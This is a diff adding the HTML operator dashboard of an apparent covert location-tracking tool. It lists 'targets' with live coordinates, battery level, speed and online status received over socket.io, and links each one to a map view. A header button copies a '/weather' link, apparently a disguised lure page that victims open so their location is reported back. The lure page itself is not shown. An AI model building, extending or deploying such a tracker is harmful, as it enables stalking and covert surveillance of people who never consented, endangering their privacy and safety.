@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tracker Dashboard</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #07070d; color: #fff; font-family: 'Inter', sans-serif; min-height: 100vh; }
+        .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(79,172,254,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(79,172,254,0.025) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; }
+        .bg-glow-tl { position: fixed; top: -20%; left: -10%; width: 60%; height: 60%; background: radial-gradient(circle, rgba(79,172,254,0.06), transparent 70%); z-index: 0; }
+        .bg-glow-br { position: fixed; bottom: -20%; right: -10%; width: 60%; height: 60%; background: radial-gradient(circle, rgba(240,147,251,0.04), transparent 70%); z-index: 0; }
+
+        .app { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; padding: 1.5rem; }
+
+        header { display: flex; align-items: center; justify-content: space-between; padding: 1rem 1.5rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; margin-bottom: 1.5rem; }
+        header .brand h1 { font-size: 1.2rem; font-weight: 800; background: linear-gradient(135deg, #f093fb, #f5576c, #4facfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        header .brand p { font-size: 0.7rem; color: rgba(255,255,255,0.2); margin-top: 0.1rem; }
+        header .brand p a { color: rgba(79,172,254,0.5); text-decoration: none; }
+        header .brand p a:hover { color: #4facfe; }
+        header .remote-badge { display: flex; align-items: center; gap: 0.5rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 10px; padding: 0.5rem 1rem; cursor: pointer; transition: all 0.3s; }
+        header .remote-badge:hover { border-color: rgba(79,172,254,0.3); }
+        header .remote-badge .dot { width: 6px; height: 6px; border-radius: 50%; background: #00ff88; box-shadow: 0 0 8px rgba(0,255,136,0.4); }
+        header .remote-badge code { font-size: 0.7rem; color: rgba(255,255,255,0.3); }
+        header .remote-badge .copy-icon { font-size: 0.7rem; color: rgba(255,255,255,0.2); }
+
+        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 0.8rem; margin-bottom: 1.5rem; }
+        .stat-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 14px; padding: 1.2rem; text-align: center; transition: all 0.3s; }
+        .stat-card:hover { background: rgba(255,255,255,0.03); border-color: rgba(79,172,254,0.15); }
+        .stat-card .num { font-size: 1.8rem; font-weight: 800; background: linear-gradient(135deg, #4facfe, #00f2fe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .stat-card .label { font-size: 0.7rem; color: rgba(255,255,255,0.25); text-transform: uppercase; letter-spacing: 1px; margin-top: 0.3rem; }
+        .stat-card.online .num { background: linear-gradient(135deg, #00ff88, #00cc6a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem; }
+        .panel-header h2 { font-size: 0.85rem; font-weight: 600; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 1.5px; }
+        .panel-header .actions { display: flex; gap: 0.5rem; }
+        .panel-header .search-box { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 10px; padding: 0.4rem 0.8rem; color: rgba(255,255,255,0.5); font-size: 0.8rem; outline: none; width: 160px; }
+        .panel-header .search-box::placeholder { color: rgba(255,255,255,0.15); }
+        .panel-header .search-box:focus { border-color: rgba(79,172,254,0.3); }
+
+        .targets-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 0.8rem; }
+        .target-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 1.2rem; transition: all 0.3s; cursor: pointer; position: relative; overflow: hidden; }
+        .target-card:hover { background: rgba(255,255,255,0.04); border-color: rgba(79,172,254,0.2); transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
+        .target-card .top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.8rem; }
+        .target-card .name { font-weight: 700; font-size: 1rem; color: #fff; }
+        .target-card .status-badge { font-size: 0.6rem; padding: 0.2rem 0.5rem; border-radius: 6px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .target-card .status-badge.online { background: rgba(0,255,136,0.08); color: #00ff88; border: 1px solid rgba(0,255,136,0.15); }
+        .target-card .status-badge.offline { background: rgba(255,255,255,0.03); color: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.05); }
+        .target-card .meta { display: flex; flex-wrap: wrap; gap: 0.5rem; font-size: 0.7rem; color: rgba(255,255,255,0.2); }
+        .target-card .meta span { background: rgba(255,255,255,0.03); padding: 0.2rem 0.5rem; border-radius: 6px; }
+        .target-card .meta .highlight { color: rgba(79,172,254,0.6); }
+        .target-card .view-btn { margin-top: 0.8rem; display: inline-flex; align-items: center; gap: 0.3rem; font-size: 0.75rem; color: #4facfe; text-decoration: none; font-weight: 600; transition: gap 0.3s; }
+        .target-card .view-btn:hover { gap: 0.6rem; }
+        .target-card.new-item { animation: slideIn 0.4s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .empty-state { grid-column: 1 / -1; text-align: center; padding: 4rem 2rem; color: rgba(255,255,255,0.1); font-size: 0.85rem; border: 1px dashed rgba(255,255,255,0.04); border-radius: 16px; }
+        .toast { position: fixed; top: 1.5rem; right: 1.5rem; background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.15); border-radius: 12px; padding: 0.6rem 1.2rem; color: #00ff88; font-size: 0.8rem; font-weight: 500; transform: translateX(120%); transition: transform 0.4s ease; z-index: 100; }
+        .toast.show { transform: translateX(0); }
+
+        @media(max-width: 600px) {
+            .app { padding: 1rem; }
+            header { flex-direction: column; gap: 0.8rem; }
+            header .remote-badge { width: 100%; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .targets-grid { grid-template-columns: 1fr; }
+            .panel-header { flex-direction: column; gap: 0.5rem; align-items: stretch; }
+            .panel-header .search-box { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="bg-glow-tl"></div>
+    <div class="bg-glow-br"></div>
+    <div class="toast" id="toast"></div>
+
+    <div class="app">
+        <header>
+            <div class="brand">
+                <h1>Tracker</h1>
+                <p>Developed by <a href="https://github.com/JitendraNishad91">JitendraNishad91</a></p>
+            </div>
+            <div class="remote-badge" onclick="copyRemote()">
+                <span class="dot"></span>
+                <code>{{ global.remoteURL }}/weather</code>
+                <span class="copy-icon">📋</span>
+            </div>
+        </header>
+
+        <div class="stats-row">
+            <div class="stat-card online">
+                <div class="num" id="online-count">0</div>
+                <div class="label">Online Now</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="total-count">0</div>
+                <div class="label">Total Targets</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="update-count">0</div>
+                <div class="label">Location Updates</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="uptime">--</div>
+                <div class="label">Uptime</div>
+            </div>
+        </div>
+
+        <div class="panel-header">
+            <h2>Targets</h2>
+            <div class="actions">
+                <input class="search-box" id="search" placeholder="Search targets..." oninput="filterTargets()">
+            </div>
+        </div>
+
+        <div class="targets-grid" id="targets-grid">
+            <div class="empty-state">Waiting for targets to connect...</div>
+
+            {{ for(target, id in TARGETS) }}
+            <div class="target-card" data-id="{{ id }}" data-name="{{ id }}" onclick="window.location='/map?id={{ id }}'">
+                <div class="top">
+                    <span class="name">{{ id }}</span>
+                    <span class="status-badge {{ target.lastSeen > Date.now() - 30000 ? 'online' : 'offline' }}">{{ target.lastSeen > Date.now() - 30000 ? 'Live' : 'Offline' }}</span>
+                </div>
+                <div class="meta">
+                    <span>📍 {{ target.lat.toFixed(4) }}, {{ target.lng.toFixed(4) }}</span>
+                    <span>🔄 {{ target.updateCount || 0 }}</span>
+                    {{ target.battery ? '<span>🔋 ' + target.battery + '%</span>' : '' }}
+                    {{ target.speed ? '<span>🚀 ' + target.speed.toFixed(1) + ' m/s</span>' : '' }}
+                </div>
+                <span class="view-btn">View on Map →</span>
+            </div>
+            {{/}}
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        const grid = document.getElementById("targets-grid")
+        const search = document.getElementById("search")
+        const onlineEl = document.getElementById("online-count")
+        const totalEl = document.getElementById("total-count")
+        const updateEl = document.getElementById("update-count")
+        const uptimeEl = document.getElementById("uptime")
+        const toast = document.getElementById("toast")
+        let targets = {}
+
+        {{ for(value, key in TARGETS) }}
+        targets["{{ key }}"] = { lat: {{ value.lat }}, lng: {{ value.lng }}, battery: {{ value.battery ?? 'null' }}, speed: {{ value.speed ?? 'null' }}, lastSeen: {{ value.lastSeen }}, updateCount: {{ value.updateCount || 0 }} };
+        {{/}}
+
+        function showToast(msg) { toast.textContent = msg; toast.classList.add("show"); setTimeout(() => toast.classList.remove("show"), 2500) }
+
+        function copyRemote() {
+            const url = "{{ global.remoteURL }}/weather"
+            navigator.clipboard.writeText(url)
+            showToast("Link copied!")
+        }
+
+        function filterTargets() {
+            const q = search.value.toLowerCase()
+            document.querySelectorAll(".target-card").forEach(c => {
+                c.style.display = c.dataset.name.includes(q) ? "" : "none"
+            })
+        }
+
+        function updateStats() {
+            const vals = Object.values(targets)
+            const now = Date.now()
+            const online = vals.filter(t => now - t.lastSeen < 30000).length
+            onlineEl.textContent = online
+            totalEl.textContent = vals.length
+        }
+
+        const socket = io("", { secure: true, path: "/socket.io", transports: ['websocket'] })
+
+        socket.on("user-connected", id => {
+            showToast(`New target connected: ${id}`)
+            const empty = grid.querySelector(".empty-state")
+            if (empty) empty.remove()
+
+            const card = document.createElement("div")
+            card.className = "target-card new-item"
+            card.dataset.id = id
+            card.dataset.name = id
+            card.onclick = () => window.location = `/map?id=${id}`
+            card.innerHTML = `<div class="top"><span class="name">${id}</span><span class="status-badge online">Live</span></div><div class="meta"><span>📍 Waiting for data...</span></div><span class="view-btn">View on Map →</span>`
+            grid.appendChild(card)
+
+            targets[id] = { lat: 0, lng: 0, battery: null, speed: null, lastSeen: Date.now(), updateCount: 0 }
+            updateStats()
+        })
+
+        socket.on("map-data", data => {
+            const card = grid.querySelector(`[data-id="${data.id}"]`)
+            if (!card) return
+
+            targets[data.id] = { lat: data.lat, lng: data.lng, battery: data.battery, speed: data.speed, lastSeen: data.time || Date.now(), updateCount: (targets[data.id]?.updateCount || 0) + 1 }
+
+            card.dataset.lastSeen = data.time || Date.now()
+            card.innerHTML = `<div class="top"><span class="name">${data.id}</span><span class="status-badge online">Live</span></div><div class="meta"><span>📍 ${data.lat.toFixed(4)}, ${data.lng.toFixed(4)}</span><span>🔄 ${targets[data.id].updateCount}</span>${data.battery ? '<span>🔋 ' + data.battery + '%</span>' : ''}${data.speed ? '<span>🚀 ' + data.speed.toFixed(1) + ' m/s</span>' : ''}</div><span class="view-btn">View on Map →</span>`
+            updateStats()
+        })
+
+        function updateUptime() {
+            const now = Date.now()
+            const start = {{ STATS.startTime }}
+            const sec = Math.floor((now - start) / 1000)
+            const d = Math.floor(sec / 86400)
+            const h = Math.floor((sec % 86400) / 3600)
+            const m = Math.floor((sec % 3600) / 60)
+            uptimeEl.textContent = d > 0 ? `${d}d ${h}h` : `${h}h ${m}m`
+            updateEl.textContent = {{ STATS.totalUpdates }}
+        }
+        setInterval(updateUptime, 10000)
+        updateUptime()
+        updateStats()
+    </script>
+</body>
+</html>
